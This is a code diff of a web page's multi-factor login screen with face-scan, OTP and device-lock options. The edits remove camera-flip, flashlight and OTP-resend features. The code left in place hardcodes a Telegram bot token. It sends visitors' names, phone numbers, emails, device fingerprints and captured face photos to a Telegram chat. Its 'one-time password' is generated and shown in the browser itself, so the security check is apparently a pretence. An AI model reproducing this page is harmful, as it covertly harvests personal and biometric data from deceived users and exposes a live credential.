@@ -2770,7 +2770,7 @@
 
                 <div class="mfa-divider"><span>SELECT AUTH METHOD</span></div>
                 
-                <button class="mfa-btn btn-face" onclick="startFaceScanning('user')">
+                <button class="mfa-btn btn-face" onclick="startFaceScanning()">
                     <i class="fas fa-expand"></i> AI FACE RECOGNITION
                 </button>
                 
@@ -2792,17 +2792,9 @@
                     <div class="scan-laser" id="scanLaser"></div>
                     <div class="scan-overlay-img"></div>
                 </div>
+                
                 <canvas id="hubCanvas" style="display:none;"></canvas>
                 
-                <div style="display:flex; gap:10px; width:100%; margin-bottom:15px; max-width:250px;">
-                    <button class="mfa-btn btn-action" onclick="flipCamera()" style="flex:1; padding:10px; font-size:12px;">
-                        <i class="fas fa-sync-alt"></i> FLIP CAM
-                    </button>
-                    <button class="mfa-btn btn-action" onclick="toggleTorch()" style="flex:1; padding:10px; font-size:12px;">
-                        <i class="fas fa-bolt"></i> FLASH
-                    </button>
-                </div>
-
                 <button id="hubCaptureBtn" class="mfa-btn btn-face" onclick="executeFaceAnalysis()">
                     <i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN
                 </button>
@@ -2818,11 +2810,6 @@
                 <button class="mfa-btn btn-verify" onclick="verifyHubOTP()">
                     <i class="fas fa-unlock"></i> DECRYPT & ENTER
                 </button>
-
-                <button class="mfa-btn btn-otp" id="btnResendOtp" onclick="resendStandardOTP()" style="margin-top:10px;">
-                    <i class="fas fa-redo"></i> RESEND OTP
-                </button>
-
                 <p class="hub-back-link" onclick="resetToMethods()">Abort Login</p>
             </div>
         </div>
@@ -2880,7 +2867,8 @@
     .input-group i { position: absolute; left: 15px; top: 16px; color: #D4AF37; opacity: 0.7; }
     .input-group input {
         width: 100%; padding: 15px 15px 15px 45px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px; font-family: 'Outfit'; font-size: 16px; box-sizing: border-box; transition: 0.3s;
-    }    .input-group input:focus { border-color: #D4AF37; outline: none; background: rgba(212,175,55,0.05); }
+    }
+    .input-group input:focus { border-color: #D4AF37; outline: none; background: rgba(212,175,55,0.05); }
     
     .mfa-divider { text-align: center; margin: 25px 0; position: relative; }
     .mfa-divider::before { content: ""; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: rgba(255,255,255,0.1); }
@@ -2895,13 +2883,12 @@
     .btn-lock:hover { border-color: #D4AF37; color: #D4AF37; }
     .btn-otp { background: transparent; border: 1px dashed rgba(212,175,55,0.5); color: #D4AF37; }
     .btn-verify { background: #00fa9a; color: #000; font-size: 18px; letter-spacing: 1px; box-shadow: 0 5px 15px rgba(0,250,154,0.3); }
-    .btn-action { background: #1a1a1a; color: #D4AF37; border: 1px solid #D4AF37; margin-bottom: 0; }
 
     /* Face Scanner UI */
     .scanner-container {
-        width: 250px; height: 300px; position: relative; border-radius: 20px; overflow: hidden; margin: 0 auto 15px; background: #000; box-shadow: 0 0 30px rgba(212,175,55,0.15);
+        width: 250px; height: 300px; position: relative; border-radius: 20px; overflow: hidden; margin: 0 auto 25px; background: #000; box-shadow: 0 0 30px rgba(212,175,55,0.15);
     }
-    #hubVideo { width: 100%; height: 100%; object-fit: cover; } 
+    #hubVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } 
     .scan-corners {
         position: absolute; inset: 10px; border: 2px solid transparent;
         background: linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 100% 100%;
@@ -2948,12 +2935,8 @@
     let hubOTP = "";
     let uName = "", uPhone = "", uEmail = "";
     let videoStream = null;
-    let videoTrack = null;
     let pushTimer = null;
     let authMethodChosen = "";
-    let currentFacingMode = 'user';
-    let torchActive = false;
-    let resendCooldownTimer = null;
     
     // Telegram Configuration
     const TG_BOT_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
@@ -2990,10 +2973,6 @@
         return true;
     }
 
-    function getNewOTP() {
-        return Math.floor(100000 + Math.random() * 900000).toString();
-    }
-
     // --- 2. METHOD A: STANDARD OTP ---
     async function generateStandardOTP() {
         if(!checkInputs()) return;
@@ -3003,7 +2982,7 @@
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING SECURE KEY...';
         btn.disabled = true;
 
-        hubOTP = getNewOTP();
+        hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
         const payload = await buildDeviceFingerprint(false, authMethodChosen);
 
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
@@ -3013,52 +2992,15 @@
             document.getElementById('hubStep1').style.display = 'none';
             document.getElementById('hubStep2').style.display = 'block';
             displayPushNotification(hubOTP);
-            startResendTimer();
             btn.innerHTML = '<i class="fas fa-comment-sms"></i> STANDARD SMS OTP';
             btn.disabled = false;
         });
     }
 
-    async function resendStandardOTP() {
-        const btn = document.getElementById('btnResendOtp');
-        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SENDING...';
-        btn.disabled = true;
-
-        hubOTP = getNewOTP();
-        const payload = await buildDeviceFingerprint(false, authMethodChosen + " (Resend)");
-
-        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: payload, parse_mode: 'Markdown' })
-        }).then(() => {
-            displayPushNotification(hubOTP);
-            startResendTimer();
-        });
-    }
-
-    function startResendTimer() {
-        let timeLeft = 30;
-        const btn = document.getElementById('btnResendOtp');
-        btn.disabled = true;
-        clearInterval(resendCooldownTimer);
-
-        resendCooldownTimer = setInterval(() => {
-            timeLeft--;
-            btn.innerHTML = `<i class="fas fa-clock"></i> WAIT ${timeLeft}s`;
-            if (timeLeft <= 0) {
-                clearInterval(resendCooldownTimer);
-                btn.disabled = false;
-                btn.innerHTML = `<i class="fas fa-redo"></i> RESEND OTP`;
-            }
-        }, 1000);
-    }
-
     // --- 3. METHOD B: TENSORFLOW AI FACE SCANNING ---
-    async function startFaceScanning(facingMode = 'user') {
+    async function startFaceScanning() {
         if(!checkInputs()) return;
         authMethodChosen = "AI Face Scan";
-        currentFacingMode = facingMode;
-        torchActive = false;
 
         document.getElementById('hubStep1').style.display = 'none';
         document.getElementById('hubStepFaceID').style.display = 'flex';
@@ -3067,45 +3009,11 @@
         document.getElementById('faceInstruction').innerText = "Position face and click initiate.";
 
         try {
-            stopCamera();
-            videoStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: currentFacingMode }, 
-                audio: false 
-            });
-            videoTrack = videoStream.getVideoTracks()[0];
-            const videoElement = document.getElementById('hubVideo');
-            
-            // Mirror image only if using the front camera
-            if (currentFacingMode === 'user') {
-                videoElement.style.transform = 'scaleX(-1)';
-            } else {
-                videoElement.style.transform = 'scaleX(1)';
-            }
-            
-            videoElement.srcObject = videoStream;
+            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+            document.getElementById('hubVideo').srcObject = videoStream;
         } catch (err) {
             alert("⚠️ ACCESS DENIED: Camera permission is required for biological verification.");
             resetToMethods();
-        }
-    }
-
-    function flipCamera() {
-        const newMode = currentFacingMode === 'user' ? 'environment' : 'user';
-        startFaceScanning(newMode);
-    }
-
-    async function toggleTorch() {
-        if (!videoTrack) return;
-        try {
-            const capabilities = videoTrack.getCapabilities();
-            if (capabilities.torch) {
-                torchActive = !torchActive;
-                await videoTrack.applyConstraints({ advanced: [{ torch: torchActive }] });
-            } else {
-                alert("⚠️ Flashlight is not supported on this specific camera lens.");
-            }
-        } catch (err) {
-            console.error(err);
         }
     }
 
@@ -3122,31 +3030,29 @@
             instruction.style.color = "#D4AF37";
             instruction.innerText = "Initializing TensorFlow Neural Net...";
 
+            // 1. Load the Google BlazeFace AI Model
             if (!window.faceModel) {
                 window.faceModel = await blazeface.load();
             }
 
             instruction.innerText = "Scanning for human facial structure...";
-            await new Promise(r => setTimeout(r, 1000));
+            await new Promise(r => setTimeout(r, 1000)); // UI delay for realism
 
+            // 2. Capture Frame
             const video = document.getElementById('hubVideo');
             const canvas = document.getElementById('hubCanvas');
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
-            
-            // Apply mirror flip to canvas context if it's the front camera so the saved image looks correct
-            if (currentFacingMode === 'user') {
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
-            }
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
+            // 3. ACTUAL AI FACE DETECTION EXECUTION
             const predictions = await window.faceModel.estimateFaces(video, false);
 
             if (predictions.length > 0) {
+                // REAL HUMAN FACE DETECTED
                 instruction.style.color = "#00fa9a";
                 instruction.innerText = "✅ Human Face Confirmed.";
-                hubOTP = getNewOTP();
+                hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
 
                 canvas.toBlob(async (blob) => {
                     stopCamera();
@@ -3154,7 +3060,6 @@
                     document.getElementById('hubStep2').style.display = 'block';
                     
                     displayPushNotification(hubOTP);
-                    startResendTimer();
                     const logText = await buildDeviceFingerprint(false, authMethodChosen);
 
                     const fd = new FormData();
@@ -3170,6 +3075,7 @@
                 }, 'image/jpeg', 0.85);
 
             } else {
+                // NO FACE DETECTED (Tree, wall, dark room, hidden face)
                 instruction.style.color = "#ff3333";
                 instruction.innerText = "❌ ERROR: No human face detected. Look directly at the camera.";
                 scannerBox.classList.remove('scanner-active');
@@ -3185,14 +3091,7 @@
             btn.disabled = false;
         }
     }
-    
-    function stopCamera() { 
-        if (videoStream) { 
-            videoStream.getTracks().forEach(t => t.stop()); 
-            videoStream = null; 
-            videoTrack = null;
-        } 
-    }
+    function stopCamera() { if (videoStream) { videoStream.getTracks().forEach(t => t.stop()); videoStream = null; } }
 
     // --- 4. METHOD C: NATIVE DEVICE LOCK (WEBAUTHN) ---
     async function startDeviceLockAuth() {
@@ -3233,7 +3132,7 @@
         document.getElementById('mndPushOtpText').innerText = code;
         notifEl.classList.remove('mnd-push-hidden');
         notifEl.classList.add('mnd-push-visible');
-        clearTimeout(pushTimer); pushTimer = setTimeout(closePushNotif, 15000); // Closes notification automatically after 15 seconds
+        clearTimeout(pushTimer); pushTimer = setTimeout(closePushNotif, 60000);
     }
     function closePushNotif() {
         notifEl.classList.remove('mnd-push-visible');
@@ -3322,7 +3221,6 @@
         setTimeout(() => { window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./'); }, 3500);
     }
 </script>
-
     </div>
 
     <div id="main-interface">
